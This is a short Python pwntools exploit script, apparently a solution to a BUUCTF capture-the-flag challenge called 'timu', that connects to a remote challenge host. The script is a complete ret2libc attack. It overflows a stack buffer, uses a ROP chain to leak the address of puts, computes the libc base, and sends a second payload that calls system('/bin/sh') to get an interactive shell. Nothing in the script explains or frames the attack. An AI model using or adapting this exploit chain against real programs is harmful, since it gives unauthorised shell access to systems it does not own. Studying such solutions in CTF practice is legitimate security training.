from pwn import *

#sh=process("./timu")
sh=remote("node4.buuoj.cn",26403)
elf=ELF("./timu")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

puts_plt=p64(elf.plt["puts"])
puts_got=p64(elf.got["puts"])
main_addr=p64(0x00000000004006AD)
pop_rdi_ret=p64(0x0000000000400733)
ret=p64(0x00000000004004c9)

payload=0x28*b'a'+pop_rdi_ret+puts_got+puts_plt+main_addr
sh.recv()
sh.sendline(payload)
puts_addr=u64(sh.recv(6).ljust(8,b'\x00'))
print("puts_addr =",puts_addr)

libc_base=puts_addr-libc.sym["puts"]
system_addr=p64(libc_base+libc.sym["system"])
bin_sh=p64(libc_base+next(libc.search(b"/bin/sh")))
payload1=0x28*b'a'+ret+pop_rdi_ret+bin_sh+system_addr+p64(0xdeadbeef)
sh.sendline(payload1)
sh.interactive()
